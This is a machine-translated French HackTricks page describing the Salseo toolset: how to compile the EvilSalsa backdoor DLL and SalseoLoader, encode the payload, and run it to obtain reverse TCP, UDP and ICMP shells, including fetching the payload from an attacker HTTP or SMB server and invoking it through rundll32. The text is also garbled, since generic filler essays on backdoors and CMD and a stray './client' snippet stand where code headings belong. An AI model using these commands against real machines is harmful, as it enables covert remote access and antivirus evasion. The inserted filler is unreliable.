# Salseo

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Compilation des binaires

Téléchargez le code source depuis GitHub et compilez **EvilSalsa** et **SalseoLoader**. Vous aurez besoin de **Visual Studio** installé pour compiler le code.

Compilez ces projets pour l'architecture de la machine Windows où vous allez les utiliser (si Windows prend en charge x64, compilez-les pour cette architecture).

Vous pouvez **sélectionner l'architecture** dans Visual Studio dans l'onglet **"Build"** à gauche, dans **"Platform Target".**

(\*\*Si vous ne trouvez pas ces options, cliquez sur **"Project Tab"** puis sur **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Ensuite, compilez les deux projets (Build -> Build Solution) (Le chemin de l'exécutable apparaîtra dans les journaux) :

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Préparation de la porte dérobée

Tout d'abord, vous devrez encoder le **EvilSalsa.dll**. Pour ce faire, vous pouvez utiliser le script python **encrypterassembly.py** ou vous pouvez compiler le projet **EncrypterAssembly** :

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

Un backdoor est un moyen d'accéder à un système informatique sans être détecté. Il existe plusieurs types de backdoors, mais ils ont tous le même objectif : permettre à un attaquant d'accéder à un système à distance et d'exécuter des commandes sans être détecté.

Les backdoors peuvent être installés de différentes manières, notamment par le biais de logiciels malveillants, de vulnérabilités du système ou de l'exploitation de mots de passe faibles. Une fois installé, un backdoor peut permettre à un attaquant de voler des informations sensibles, de modifier des fichiers, d'installer d'autres logiciels malveillants ou même de prendre le contrôle complet du système.

Il existe plusieurs outils et techniques pour détecter et supprimer les backdoors sur les systèmes Windows. Certains outils populaires incluent des scanners de vulnérabilités, des antivirus et des pare-feu. Il est également important de maintenir votre système à jour avec les derniers correctifs de sécurité pour réduire les risques d'exploitation de vulnérabilités connues.

Pour prévenir les backdoors, il est essentiel de suivre de bonnes pratiques de sécurité, telles que l'utilisation de mots de passe forts, l'installation de logiciels provenant de sources fiables, la mise en place de pare-feu et la sensibilisation à la sécurité informatique. En outre, il est recommandé de réaliser régulièrement des audits de sécurité pour détecter et corriger les éventuelles vulnérabilités.

En conclusion, les backdoors sont une menace sérieuse pour la sécurité des systèmes Windows. Il est essentiel de prendre des mesures pour les détecter, les prévenir et les éliminer afin de protéger vos informations sensibles et votre système contre les attaques.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, maintenant vous avez tout ce dont vous avez besoin pour exécuter tout le truc Salseo : le **fichier EvilDalsa.dll encodé** et le **binaire de SalseoLoader**.

**Téléchargez le binaire SalseoLoader.exe sur la machine. Il ne devrait pas être détecté par un quelconque antivirus...**

## **Exécutez la porte dérobée**

### **Obtenez un shell TCP inversé (téléchargez le fichier dll encodé via HTTP)**

N'oubliez pas de démarrer un nc en tant qu'écouteur de shell inversé et un serveur HTTP pour servir le fichier evilsalsa encodé.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obtenir un shell inversé UDP (téléchargement d'un fichier DLL encodé via SMB)**

N'oubliez pas de démarrer un nc en tant qu'écouteur de shell inversé et un serveur SMB pour servir le fichier evilsalsa encodé (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obtenir un shell inversé ICMP (dll encodée déjà présente sur la victime)**

**Cette fois, vous avez besoin d'un outil spécial sur le client pour recevoir le shell inversé. Téléchargez :** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Désactiver les réponses ICMP :**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Exécuter le client:

```bash
./client
```

This command will execute the client program.
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### À l'intérieur de la victime, exécutons la chose salseo :
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilation de SalseoLoader en tant que DLL exportant la fonction principale

Ouvrez le projet SalseoLoader à l'aide de Visual Studio.

### Ajoutez avant la fonction principale: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png>)

### Installez DllExport pour ce projet

#### **Outils** --> **Gestionnaire de packages NuGet** --> **Gérer les packages NuGet pour la solution...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png>)

#### **Recherchez le package DllExport (en utilisant l'onglet Parcourir) et appuyez sur Installer (et acceptez la fenêtre contextuelle)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)

Dans le dossier de votre projet, les fichiers suivants sont apparus : **DllExport.bat** et **DllExport\_Configure.bat**

### **Désinstallez DllExport**

Appuyez sur **Désinstaller** (oui, c'est étrange mais faites-moi confiance, c'est nécessaire)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Quittez Visual Studio et exécutez DllExport\_configure**

Quittez simplement Visual Studio

Ensuite, allez dans votre dossier **SalseoLoader** et **exécutez DllExport\_Configure.bat**

Sélectionnez **x64** (si vous allez l'utiliser dans une boîte x64, c'était mon cas), sélectionnez **System.Runtime.InteropServices** (dans **Namespace for DllExport**) et appuyez sur **Appliquer**

![](<../.gitbook/assets/image (7) (1) (1) (1).png>)

### **Ouvrez à nouveau le projet avec Visual Studio**

**\[DllExport]** ne devrait plus être marqué comme une erreur

![](<../.gitbook/assets/image (8) (1).png>)

### Compilez la solution

Sélectionnez **Type de sortie = Bibliothèque de classes** (Projet --> Propriétés de SalseoLoader --> Application --> Type de sortie = Bibliothèque de classes)

![](<../.gitbook/assets/image (10) (1).png>)

Sélectionnez **Plateforme x64** (Projet --> Propriétés de SalseoLoader --> Général --> Cible de la plateforme = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Pour **compiler** la solution : Build --> Build Solution (Le chemin de la nouvelle DLL apparaîtra dans la console de sortie)

### Testez la DLL générée

Copiez et collez la DLL où vous souhaitez la tester.

Exécutez :
```
rundll32.exe SalseoLoader.dll,main
```
Si aucune erreur n'apparaît, vous avez probablement une DLL fonctionnelle !!

## Obtenir un shell en utilisant la DLL

N'oubliez pas d'utiliser un **serveur HTTP** et de configurer un **écouteur nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) is a command-line interpreter for Windows operating systems. It provides a text-based interface for executing commands and managing the system. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.

CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can perform a wide range of activities, including reconnaissance, privilege escalation, and data exfiltration.

To exploit CMD, hackers often use backdoors to gain persistent access to a compromised system. A backdoor is a hidden entry point that allows unauthorized access to a system. By installing a backdoor on a target system, hackers can maintain access even if the system is patched or the user's password is changed.

There are several ways to create a backdoor in CMD. One common method is to use the "netsh" command to create a persistent backdoor. The "netsh" command is a powerful tool that allows users to configure network settings. By using the "netsh" command, hackers can create a backdoor that listens for incoming connections and provides them with remote access to the compromised system.

Another method is to use the "reg" command to create a backdoor in the Windows Registry. The Windows Registry is a hierarchical database that stores configuration settings and options for the operating system. By modifying the Registry, hackers can create a backdoor that is executed every time the system starts up, providing them with persistent access to the compromised system.

In addition to creating backdoors, hackers can also use CMD to perform other malicious activities. For example, they can use CMD to execute malware, steal sensitive information, or launch denial-of-service attacks.

To protect against CMD-based attacks, it is important to implement strong security measures, such as regularly updating the operating system, using strong passwords, and monitoring system logs for suspicious activities. Additionally, it is recommended to use antivirus software and firewall to detect and block malicious CMD commands and scripts.

By understanding how CMD works and the various techniques used by hackers, you can better protect your systems and networks from unauthorized access and malicious activities.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
